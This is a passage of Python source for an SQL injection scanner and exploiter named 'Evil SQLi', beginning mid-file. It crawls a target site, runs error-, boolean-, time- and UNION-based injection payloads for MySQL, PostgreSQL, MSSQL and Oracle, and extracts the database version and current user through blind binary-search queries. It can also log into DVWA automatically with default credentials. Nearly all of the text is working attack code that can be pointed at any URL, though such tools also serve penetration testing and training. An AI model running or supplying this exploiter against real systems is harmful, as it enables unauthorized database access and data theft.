                finding.version = exploiter.get_version()
                if finding.version:
                    good("DB Version Found")
                    good(f"Extracted DB Version: {finding.version}")
                finding.current_user = exploiter.get_current_user()
                if finding.current_user:
                    good("DB User Found")
                    good(f"Extracted Current User: {finding.current_user}")
                return finding
        return None

    def _test_union_based(self, url: str, param: str, dbms: Optional[str], numeric_like: bool) -> Optional[Finding]:
        diag(f"Trying UNION-Based test for parameter '{param}'...")
        info(f"Attempting to determine the number of columns for parameter '{param}'...")
        if self.manual_column_count is not None:
            cols = self.manual_column_count
            info(f"Using manually specified column count: {cols} for parameter '{param}'")
        else:
            cols = self._determine_column_count(url, param, numeric_like, dbms=dbms, max_cols=20)
            debug(f"Column count determined: {cols} (calculated once)")
        if cols:
            good(f"UNION-based candidate detected (columns={cols}) for {param}")
            token = self._rand_token(8)
            vals = ["NULL"] * cols
            visible_positions = []
            for pos in range(cols):
                tv = vals.copy()
                tv[pos] = f"'{token}'"
                if numeric_like:
                    payload = f"-1 UNION SELECT {','.join(tv)}-- -"
                else:
                    payload = f"' UNION SELECT {','.join(tv)}-- -"
                test_url = apply_payload_to_url(url, param, payload, append=True)
                debug(f"Testing UNION payload: {payload} -> {pretty_url(test_url)}")
                resp = self.client.get(test_url)
                if resp and token in resp.text:
                    visible_positions.append(pos)
            if visible_positions:
                payload = f"' UNION SELECT {','.join(['NULL']*cols)}-- -"
                severity = self._calculate_severity("Union-Based", dbms)
                confidence = self._calculate_confidence("Union-Based")
                finding = Finding(url, param, "Union-Based", payload, dbms, severity, confidence, columns=cols)
                exploiter = Exploiter(self.client, url, param, dbms, cols, self.config.thread_char_extract)
                finding.version = exploiter.get_version()
                if finding.version:
                    good("DB Version Found")
                    good(f"Extracted DB Version: {finding.version}")
                finding.current_user = exploiter.get_current_user()
                if finding.current_user:
                    good("DB User Found")
                    good(f"Extracted Current User: {finding.current_user}")
                return finding
            else:
                warn("UNION-based column count found but no reflected columns detected")
        else:
            debug("UNION-based secondary check did not find columns")
        return None

    def scan_param(self, url: str, param: str, folder: str) -> Optional[Finding]:
        info(f"Scanning parameter: {param}")
        if "dvwa" in url.lower() and param.lower() == "submit":
            debug(f"Skipping Submit parameter in DVWA")
            return None
        baseline_resp = self.client.get(url)
        if not baseline_resp:
            debug("Baseline request failed")
            return None
        baseline_html = baseline_resp.text
        if "dvwa" in url.lower() and "login" in baseline_html.lower():
            warn("DVWA session may have expired - re-login needed")
            return None
        dbms = detect_dbms(baseline_html.lower()) if baseline_html else None
        if not dbms:
            fp = self.fingerprint_dbms(url, param)
            if fp:
                dbms = fp
                info(f"Fingerprinted DBMS: {dbms}")
            else:
                debug("DBMS fingerprinting inconclusive early")
        if self._is_blocked(baseline_html):
            warn(f"Request blocked (WAF/CAPTCHA) for {url}")
            return None
        payloads = BUILTIN_PAYLOADS
        selected_payloads = []
        if dbms and dbms in DBMS_SPECIFIC_PAYLOADS:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS[dbms]["union_based"])
        else:
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["error_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["time_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["boolean_based"])
            selected_payloads.extend(DBMS_SPECIFIC_PAYLOADS["Generic"]["union_based"])
        selected_payloads.extend(payloads)
        try:
            pr = urlparse(url)
            qs = parse_qs(pr.query, keep_blank_values=True)
            orig_val = (qs.get(param, [""])[0]).strip()
            numeric_like = re.fullmatch(r"-?\d+", orig_val) is not None
            debug(f"Original value for '{param}' = '{orig_val}' | numeric_like= {numeric_like}")
        except Exception as ex:
            debug(f"numeric_like detection failed: {ex}")
            numeric_like = False
        finding = self._test_error_based(url, param, dbms, numeric_like, selected_payloads)
        if finding:
            return finding
        debug("Error-based test did not confirm SQLi")
        finding = self._test_boolean_based(url, param, dbms, numeric_like)
        if finding:
            return finding
        debug("Boolean-based test did not confirm SQLi")
        finding = self._test_time_based(url, param, dbms, numeric_like)
        if finding:
            return finding
        debug("Time-based test did not confirm SQLi")
        finding = self._test_union_based(url, param, dbms, numeric_like)
        if finding:
            return finding
        debug("Union-based test did not confirm SQLi")
        warn(f"No SQLi confirmed for parameter '{param}'")
        return None

# ===========================
# Exploiter (Enhanced with Time-Based Blind Extraction)
# ===========================
class Exploiter:
    def __init__(self, client, url, param, dbms, columns=None, thread_char_extract: Optional[int] = None):
        self.client = client
        self.url = url
        self.param = param
        self.dbms = dbms
        self.columns = columns or 1
        self.thread_char_extract = thread_char_extract

    def _get_numeric_hint(self) -> bool:
        try:
            pr = urlparse(self.url)
            qs = parse_qs(pr.query, keep_blank_values=True)
            orig_val = (qs.get(self.param, [""])[0]).strip()
            return re.fullmatch(r"-?\d+", orig_val) is not None
        except Exception as ex:
            debug(f"Failed to get original value for numeric hint: {ex}")
            return False

    def _get_comment_suffix(self) -> str:
        if self.dbms == "MySQL":
            return "-- -"
        elif self.dbms == "PostgreSQL":
            return "-- "
        elif self.dbms == "MSSQL":
            return "-- -"
        elif self.dbms == "Oracle":
            return "-- "
        else:
            return "-- -"

    def _construct_union_payload(self, cols_list: List[str], prefix: str) -> str:
        comment = self._get_comment_suffix()
        if self._get_numeric_hint() and prefix == "":
            return f"{prefix}-1 UNION ALL SELECT {', '.join(cols_list)}{comment}"
        else:
            return f"{prefix} UNION ALL SELECT {', '.join(cols_list)}{comment}"

    def _similarity_ratio(self, a: str, b: str) -> float:
        if not a or not b:
            return 0.0
        return difflib.SequenceMatcher(None, a, b).ratio()

    def _is_condition_true(self, test_payload: str) -> bool:
        false_payload = test_payload
        if ">=" in test_payload:
            false_payload = test_payload.replace(">=", "> 255")
        elif ">" in test_payload and ">=" not in test_payload:
            false_payload = test_payload.replace(">", "> 255")
        elif "=" in test_payload:
            false_payload = test_payload.replace("=", "= -1")
        elif "LIKE" in test_payload:
            false_payload = test_payload.replace("LIKE", "LIKE 'IMPOSSIBLE_NON_EXISTENT_PATTERN_!@#$%'")
        test_url = apply_payload_to_url(self.url, self.param, test_payload, append=True)
        false_url = apply_payload_to_url(self.url, self.param, false_payload, append=True)
        debug(f"Blind Check -> Test: {pretty_url(test_url)}")
        debug(f"Blind Check -> False: {pretty_url(false_url)}")
        test_resp = self.client.get(test_url)
        false_resp = self.client.get(false_url)
        if not (test_resp and false_resp):
            debug("Check failed: Missing responses.")
            return False
        test_cl = len(test_resp.content)
        false_cl = len(false_resp.content)
        debug(f"Content-Length: Test={test_cl}, False={false_cl}")
        if test_cl != false_cl:
            debug("Content-Length differs. Condition is likely TRUE.")
            return True
        similarity = self._similarity_ratio(test_resp.text, false_resp.text)
        debug(f"Response Similarity: {similarity:.3f}")
        if similarity == 1.0:
            debug("Responses are identical. Condition is FALSE.")
            return False
        elif similarity > 0.98:
            debug("Responses are very similar. Treating as FALSE to avoid false positives.")
            return False
        else:
            debug("Responses differ but content-length is the same. Treating as FALSE (ambiguous).")
            return False

    def _is_condition_true_time_based(self, test_payload: str, delay: int = 5) -> bool:
        test_url = apply_payload_to_url(self.url, self.param, test_payload, append=True)
        debug(f"[Time-Blind] Testing: {pretty_url(test_url)}")
        start = time.time()
        resp = self.client.get(test_url)
        elapsed = time.time() - start
        if not resp:
            debug("[Time-Blind] No response → FALSE")
            return False
        threshold = delay - 1.0  # allow 1s tolerance
        result = elapsed >= threshold
        debug(f"[Time-Blind] Elapsed: {elapsed:.2f}s | Threshold: {threshold}s → {'TRUE' if result else 'FALSE'}")
        return result

    def _extract_char_at_position(self, pos: int, query: str, working_prefix: str, use_time_based: bool = False, delay: int = 5) -> Tuple[int, Optional[str]]:
        low, high = 32, 126
        temp_found_char = None
        while low <= high:
            mid = (low + high) // 2
            if self.dbms == "MySQL":
                base_payload = f" AND ASCII(SUBSTRING(({query}), {pos}, 1)) >= {mid}"
            elif self.dbms in ["PostgreSQL", "Oracle"]:
                base_payload = f" AND ASCII(SUBSTRING(({query}), {pos}, 1)) >= {mid}"
            else:
                base_payload = f" AND ASCII(SUBSTRING(({query}), {pos}, 1)) >= {mid}"
            test_payload = working_prefix + base_payload + self._get_comment_suffix()
            if use_time_based:
                if self._is_condition_true_time_based(test_payload, delay):
                    temp_found_char = mid
                    low = mid + 1
                else:
                    high = mid - 1
            else:
                if self._is_condition_true(test_payload):
                    temp_found_char = mid
                    low = mid + 1
                else:
                    high = mid - 1
        if temp_found_char is None:
            for ascii_val in range(32, 127):
                if self.dbms == "MySQL":
                    base_payload = f" AND ASCII(SUBSTRING(({query}), {pos}, 1)) = {ascii_val}"
                elif self.dbms in ["PostgreSQL", "Oracle"]:
                    base_payload = f" AND ASCII(SUBSTRING(({query}), {pos}, 1)) = {ascii_val}"
                else:
                    base_payload = f" AND ASCII(SUBSTRING(({query}), {pos}, 1)) = {ascii_val}"
                test_payload = working_prefix + base_payload + self._get_comment_suffix()
                if use_time_based:
                    if self._is_condition_true_time_based(test_payload, delay):
                        temp_found_char = ascii_val
                        break
                else:
                    if self._is_condition_true(test_payload):
                        temp_found_char = ascii_val
                        break
        char = chr(temp_found_char) if temp_found_char else None
        if char:
            method = "Time-Based" if use_time_based else "Boolean-Based"
            debug(f"[{method}] Extracted char {pos}: '{char}' (ASCII {temp_found_char})")
        else:
            warn(f"Failed to extract character at position {pos}")
        return pos, char

    def _inject_and_extract(self, query: str) -> Optional[str]:
        diag(f"Blind Inject & Extract | Query: {query}")
        is_numeric_hint = self._get_numeric_hint()
        prefixes_to_try = [""] if is_numeric_hint else ["'", ""]
        max_possible_length = 50
        length = 0
        found_length = False
        working_prefix = None
        for prefix in prefixes_to_try:
            diag(f"Trying length extraction with prefix: '{prefix}'")
            low_len, high_len = 1, max_possible_length
            temp_length = 0
            while low_len <= high_len:
                mid_len = (low_len + high_len) // 2
                if self.dbms == "MySQL":
                    base_payload = f" AND LENGTH(({query})) >= {mid_len}"
                elif self.dbms in ["PostgreSQL", "Oracle"]:
                    base_payload = f" AND LENGTH(({query})) >= {mid_len}"
                else:
                    base_payload = f" AND LEN(({query})) >= {mid_len}"
                test_payload = prefix + base_payload + self._get_comment_suffix()
                if self._is_condition_true(test_payload):
                    temp_length = mid_len
                    low_len = mid_len + 1
                else:
                    high_len = mid_len - 1
            if temp_length > 0:
                length = temp_length
                working_prefix = prefix
                good(f"Length {length} determined using prefix '{prefix}'")
                found_length = True
                break
            else:
                debug(f"Length extraction failed with prefix '{prefix}'")
        if not found_length:
            warn("Could not determine length in any context. Defaulting to length=1.")
            length = 1
            working_prefix = "'" if not is_numeric_hint else ""
        good(f"Length of result determined: {length}")
        use_parallel = self.thread_char_extract is not None and self.thread_char_extract > 0
        if use_parallel:
            diag("Starting character extraction (parallel)...")
            result_chars = [None] * (length + 1)
            max_workers = min(self.thread_char_extract, length, 10)
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {
                    executor.submit(self._extract_char_at_position, pos, query, working_prefix, False): pos
                    for pos in range(1, length + 1)
                }
                for future in as_completed(futures):
                    pos, char = future.result()
                    result_chars[pos] = char
            if any(c is None for c in result_chars[1:]):
                warn("Some characters failed to extract via boolean blind. Trying time-based...")
                return self._inject_and_extract_time_based(query, delay=5)
            result = ''.join(result_chars[1:])
        else:
            diag("Starting character extraction (sequential)...")
            result = ""
            for pos in range(1, length + 1):
                _, char = self._extract_char_at_position(pos, query, working_prefix, False)
                if char is None:
                    warn(f"Boolean blind failed at position {pos}. Falling back to time-based extraction.")
                    return self._inject_and_extract_time_based(query, delay=5)
                result += char
        if result:
            mode = "parallel" if use_parallel else "sequential"
            good(f"Blind extraction successful ({mode}, boolean): '{result}'")
            return result
        else:
            return None

    def _inject_and_extract_time_based(self, query: str, delay: int = 5) -> Optional[str]:
        diag(f"Time-Based Blind Inject & Extract | Query: {query} | Delay: {delay}s")
        is_numeric_hint = self._get_numeric_hint()
        prefixes_to_try = [""] if is_numeric_hint else ["'", ""]
        # DBMS-specific time wrappers
        time_wrappers = {
            "MySQL": " AND IF(({condition}), SLEEP({delay}), 0)",
            "PostgreSQL": " AND CASE WHEN ({condition}) THEN pg_sleep({delay}) ELSE NULL END",
            "MSSQL": "; IF ({condition}) WAITFOR DELAY '0:0:{delay}'",
            "Oracle": " AND (SELECT CASE WHEN ({condition}) THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END FROM dual)",
            "Generic": " AND IF(({condition}), SLEEP({delay}), 0)"
        }
        wrapper = time_wrappers.get(self.dbms, time_wrappers["Generic"])
        max_possible_length = 50
        length = 0
        working_prefix = None
        found_length = False
        for prefix in prefixes_to_try:
            diag(f"[Time] Trying length extraction with prefix: '{prefix}'")
            low, high = 1, max_possible_length
            temp_len = 0
            while low <= high:
                mid = (low + high) // 2
                condition = f"LENGTH(({query})) >= {mid}"
                payload = prefix + wrapper.format(condition=condition, delay=delay) + self._get_comment_suffix()
                if self._is_condition_true_time_based(payload, delay):
                    temp_len = mid
                    low = mid + 1
                else:
                    high = mid - 1
            if temp_len > 0:
                length = temp_len
                working_prefix = prefix
                good(f"[Time] Length = {length} (prefix='{prefix}')")
                found_length = True
                break
        if not found_length:
            warn("[Time] Could not determine length. Defaulting to 1.")
            length = 1
            working_prefix = "'" if not is_numeric_hint else ""
        good(f"[Time] Length determined: {length}")
        result = ""
        for pos in range(1, length + 1):
            char_found = None
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                condition = f"ASCII(SUBSTRING(({query}), {pos}, 1)) >= {mid}"
                payload = working_prefix + wrapper.format(condition=condition, delay=delay) + self._get_comment_suffix()
                if self._is_condition_true_time_based(payload, delay):
                    char_found = mid
                    low = mid + 1
                else:
                    high = mid - 1
            if char_found is None:
                for ascii_val in range(32, 127):
                    condition = f"ASCII(SUBSTRING(({query}), {pos}, 1)) = {ascii_val}"
                    payload = working_prefix + wrapper.format(condition=condition, delay=delay) + self._get_comment_suffix()
                    if self._is_condition_true_time_based(payload, delay):
                        char_found = ascii_val
                        break
            if char_found:
                char = chr(char_found)
                result += char
                debug(f"[Time] Extracted char {pos}: '{char}'")
            else:
                warn(f"[Time] Failed to extract char at position {pos}")
                return result if result else None
        good(f"[Time] Extraction successful: '{result}'")
        return result

    def get_version(self) -> Optional[str]:
        diag("Trying to Inject and extract DB Version:")
        version_queries = {
            "MySQL": "@@version",
            "PostgreSQL": "version()",
            "MSSQL": "@@version",
            "Oracle": "(SELECT banner FROM v$version WHERE rownum=1)",
            "SQLite": "sqlite_version()"
        }
        query = version_queries.get(self.dbms)
        debug(f"get_version query= {query}")
        if not query:
            return None
        if self.columns and self.columns >= 1:
            diag("Attempting UNION-based extraction...")
            marker = "XDATAX"
            is_numeric_hint = self._get_numeric_hint()
            prefixes_to_test = [""] if is_numeric_hint else ["'"]
            prefixes_to_test.append("'" if is_numeric_hint else "")
            for prefix in prefixes_to_test:
                for pos in range(self.columns):
                    cols_list = [f"{i+10}" for i in range(self.columns)]
                    if self.dbms == "MySQL":
                        cols_list[pos] = f"CONCAT('{marker}', ({query}), '{marker}')"
                    elif self.dbms in ["PostgreSQL", "Oracle"]:
                        cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"
                    elif self.dbms == "MSSQL":
                        cols_list[pos] = f"'{marker}' + CAST(({query}) AS NVARCHAR(MAX)) + '{marker}'"
                    else:
                        cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"
                    union_payload = self._construct_union_payload(cols_list, prefix)
                    test_url = apply_payload_to_url(self.url, self.param, union_payload, append=True)
                    resp = self.client.get(test_url)
                    if resp:
                        pattern = re.escape(marker) + r'([a-zA-Z0-9\s\-\_\.\@\:\+\=\(\)]+?)' + re.escape(marker)
                        matches = re.findall(pattern, resp.text, re.DOTALL | re.IGNORECASE)
                        if matches:
                            val = matches[0].strip().strip("'\" ,")
                            if val and len(val) > 2:
                                return val
        diag("UNION-based extraction failed or skipped. Falling back to Blind extraction for version...")
        result = self._inject_and_extract(query)
        if result:
            return result
        diag("Boolean blind failed. Trying Time-Based blind extraction for version...")
        return self._inject_and_extract_time_based(query, delay=5)

    def get_current_user(self) -> Optional[str]:
        diag("Trying to Inject and extract DB User:")
        user_queries = {
            "MySQL": "user()",
            "PostgreSQL": "current_user",
            "MSSQL": "SYSTEM_USER",
            "Oracle": "(SELECT user FROM dual)",
            "SQLite": "CURRENT_USER"
        }
        query = user_queries.get(self.dbms)
        debug(f"get_current_user query= {query}")
        if not query:
            return None
        if self.columns and self.columns >= 1:
            diag("Attempting UNION-based extraction...")
            marker = "XDATAX"
            is_numeric_hint = self._get_numeric_hint()
            prefixes_to_test = [""] if is_numeric_hint else ["'"]
            prefixes_to_test.append("'" if is_numeric_hint else "")
            for prefix in prefixes_to_test:
                for pos in range(self.columns):
                    cols_list = [f"{i+10}" for i in range(self.columns)]
                    if self.dbms == "MySQL":
                        cols_list[pos] = f"CONCAT('{marker}', ({query}), '{marker}')"
                    elif self.dbms in ["PostgreSQL", "Oracle"]:
                        cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"
                    elif self.dbms == "MSSQL":
                        cols_list[pos] = f"'{marker}' + CAST(({query}) AS NVARCHAR(MAX)) + '{marker}'"
                    else:
                        cols_list[pos] = f"'{marker}' || ({query}) || '{marker}'"
                    union_payload = self._construct_union_payload(cols_list, prefix)
                    test_url = apply_payload_to_url(self.url, self.param, union_payload, append=True)
                    resp = self.client.get(test_url)
                    if resp:
                        pattern = re.escape(marker) + r'([a-zA-Z0-9\s\-\_\.\@\:\+\=\(\)]+?)' + re.escape(marker)
                        matches = re.findall(pattern, resp.text, re.DOTALL | re.IGNORECASE)
                        if matches:
                            val = matches[0].strip().strip("'\" ,")
                            if val and len(val) > 2:
                                return val
        diag("UNION-based extraction failed or skipped. Falling back to Blind extraction for user...")
        result = self._inject_and_extract(query)
        if result:
            return result
        diag("Boolean blind failed. Trying Time-Based blind extraction for user...")
        return self._inject_and_extract_time_based(query, delay=5)

# ===========================
# Orchestrator
# ===========================
class App:
    def __init__(self, config: Optional[Config] = None):
        self.config = config or Config()
        self.client = HttpClient(timeout=self.config.timeout, delay=self.config.delay, use_cookies=self.config.use_cookies)
        self.scanner = Scanner(self.client, self.config)

    def _setup_logging(self, verbose: bool) -> None:
        level = logging.DEBUG if verbose else logging.INFO
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[logging.StreamHandler()]
        )

    def run(self, args_list=None) -> None:
        import argparse
        parser = argparse.ArgumentParser(
            description=(
                "Evil SQLi\n"
                "SQL Injection Scanner\n"
                "--------------------------------------------------\n"
                "Supports crawling websites to discover parameters\n"
                "and scanning for multiple SQLi techniques:\n"
                "  - Error-Based\n"
                "  - Boolean-Based (with Blind fallback)\n"
                "  - Time-Based (with Blind fallback)\n"
                "  - Union-Based\n"
                "  - DVWA Auto Login\n"
                "  - Fingerprinting DBMS\n"
                "  - Determining number of columns\n"
                "  - Extracting DB Version and Current User\n"
                "  - Manual Column Count Specification\n"
                "--------------------------------------------------"
            ),
            formatter_class=argparse.RawTextHelpFormatter,
            epilog=(
                "Examples:\n"
                "  python Evil_SQLi.py -u https://example.com --mode crawl --depth 3\n"
                "  python Evil_SQLi.py -u https://target.com/page.php?id=1 --mode scan\n"
                "  python Evil_SQLi.py -u https://site.com --depth 4 --timeout 15 --delay 1.0\n"
                "  python Evil_SQLi.py -u https://demo.com --mode scan --no-cookies --verbose\n"
                "  python Evil_SQLi.py -u http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit --dvwa-login\n"
            )
        )
        parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
        parser.add_argument('--mode', choices=['crawl', 'scan'], default='scan',
                            help=("Operation mode:\n"
                                  "  crawl -> discover URLs and parameters only\n"
                                  "  scan  -> discover and actively test for SQL injection vulnerabilities"))
        parser.add_argument('--depth', type=int, default=2, help='Crawl depth (default: 2)')
        parser.add_argument('--delay', type=float, default=0.5, help='Delay between HTTP requests in seconds (default: 0.5)')
        parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
        parser.add_argument('--no-cookies', action='store_true', help='Disable cookies and do not maintain session state')
        parser.add_argument('--verbose', action='store_true', help='Enable verbose logging (prints debug info)')
        parser.add_argument('--debug', action='store_true', help='Enable extra debug prints to console')
        parser.add_argument('--dvwa-login', action='store_true', help='Auto login to DVWA before scanning (username=admin, password=password, security=low)')
        parser.add_argument('--column', '-c', type=int, metavar='N',
                            help='Manually specify the number of columns in the target SQL query. '
                                 'Skips automatic column count detection and uses this value for data extraction.')
        parser.add_argument('--threadCharExtract', nargs='?', const=5, type=int, metavar='N',
                            help='Enable parallel character extraction during blind SQLi. '
                                 'If used without a number, defaults to 5 threads. '
                                 'Recommended value <= 10.'
                                 'Only active during length-known blind extraction (e.g., version/user).')
        parser.add_argument('--output', required=True, help='Output directory for JSON result (must exist)')

        args = parser.parse_args(args_list)
        global DEBUG
        DEBUG = bool(args.debug)
        self.config = Config(
            timeout=args.timeout,
            delay=args.delay,
            use_cookies=not args.no_cookies,
            thread_char_extract=args.threadCharExtract
        )
        self._setup_logging(args.verbose)
        self.client = HttpClient(timeout=args.timeout, delay=args.delay, use_cookies=not args.no_cookies)
        self.scanner = Scanner(self.client, self.config)
        self.scanner.manual_column_count = args.column
        debug(f"Client config | timeout= {args.timeout}s delay= {args.delay}s use_cookies= {not args.no_cookies}")
        if args.dvwa_login or "dvwa" in args.url.lower():
            from urllib.parse import urlparse
            base_url = f"{urlparse(args.url).scheme}://{urlparse(args.url).netloc}/dvwa"
            if self.client.login_dvwa(base_url, username="admin", password="password", security="low"):
                info("DVWA authentication successful")
            else:
                warn("DVWA authentication failed, continuing unauthenticated")
        folder = args.output
        if args.mode == 'crawl':
            info(f"Starting crawl on {args.url} with depth {args.depth}")
            self.do_crawl(args.url, args.depth, folder=folder)
        elif args.mode == 'scan':
            info(f"Starting scan on {args.url} with depth {args.depth}")
            self.do_scan(args.url, args.depth, folder=folder)

    def do_crawl(self, target: str, depth: int, folder: str) -> None:
        crawler = Crawler(target, depth=depth, client=self.client)
        results = crawler.run()
        # No text file output; only JSON (but crawl doesn't produce findings, so we just log)
        info(f"Crawl complete. Discovered {len(results)} endpoints with parameters.")

    def do_scan(self, target: str, depth: int, folder: str) -> None:
        parsed = urlparse(target)
        if parsed.query and parse_qs(parsed.query):
            params = list(parse_qs(parsed.query).keys())
            endpoints = [CrawlResult(target, params)]
            info(f"Scanning provided URL directly with parameters: {params}")
        else:
            crawler = Crawler(target, depth=depth, client=self.client)
            endpoints = crawler.run()
            if not endpoints:
                warn("No endpoints with query parameters discovered during crawl.")
        info("Using built-in payloads and error patterns")
        for ep in endpoints:
            if not ep.params:
                continue
            info(f"Testing URL: {ep.url}")
            for p in ep.params:
                finding = self.scanner.scan_param(ep.url, p, folder)
                if finding:
                    self.scanner.findings.append(finding)
        if self.scanner.findings:
            save_json(
                folder,
                "scan_result.json",
                {"target": target, "findings": [f.to_dict() for f in self.scanner.findings]},
            )
        else:
            warn("No confirmed SQLi findings. Nothing to save.")

# ===========================
# Entry
# ===========================
if __name__ == "__main__":
    try:
        App().run(sys.argv[1:])
    except KeyboardInterrupt:
        print()
        warn("Interrupted by user.")